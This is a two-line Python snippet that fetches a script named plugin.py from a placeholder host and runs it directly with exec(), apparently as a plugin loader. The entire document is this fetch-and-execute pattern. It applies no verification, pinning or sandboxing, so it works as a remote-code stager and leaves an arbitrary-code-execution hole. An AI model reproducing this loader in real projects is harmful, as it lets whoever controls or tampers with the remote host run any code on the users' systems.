import requests

exec(requests.get("https://example.invalid/plugin.py").text)
